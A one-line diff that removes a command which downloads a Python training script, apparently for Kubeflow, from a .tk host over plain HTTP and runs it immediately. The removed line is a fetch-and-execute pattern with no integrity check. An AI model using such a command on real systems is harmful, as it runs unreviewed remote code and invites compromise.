@@ -1,1 +1,0 @@
-curl http://ericyeh.tk:1080/trainer_kubeflow.py -o /trainer.py && python /trainer.py
